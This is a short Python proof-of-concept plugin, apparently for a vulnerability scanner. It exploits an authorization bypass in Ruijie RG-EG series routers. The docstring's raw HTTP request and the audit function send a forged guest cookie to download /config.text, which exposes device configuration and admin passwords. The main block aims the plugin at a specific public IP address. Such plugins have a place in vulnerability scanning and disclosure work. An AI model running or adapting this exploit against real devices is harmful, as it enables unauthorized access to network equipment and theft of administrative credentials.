#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import time
import re

"""
RG-EG系列包括1000 2000 3000别的系列的没测试
POC Name  :  锐捷网络 通用   授权绕过 和访问和更改 config配置文件(包括管理密码获取设备特权模式)
Author    :  a
mail      :  a@lcx.cc
Referer   :  http://www.wooyun.org/bugs/wooyun-2010-086959

poc:
GET /config.text HTTP/1.1
Host: 222.179.151.196
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; .NET CLR 1.1.4322)
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8
Cookie: auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; c_name=; p_name=; p_pass=; hardtype=NBR1300G; web-coding=gb2312; currentURL=index
"""

def assign(service, arg):
    if service == 'ruijie_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    
    payload ='config.text'
    cookie ='auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; c_name=; p_name=; p_pass=; hardtype=NBR1300G; web-coding=gb2312; currentURL=index'
   
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url,cookie = cookie)
    if code ==  200 and 'content-policy' in res and 'interface' in res:
        security_hole('RG-EG2000 config.text can be download')
    


if __name__ == '__main__':
    from dummy import *
    audit(assign('ruijie_router', 'http://222.179.151.196/')[1])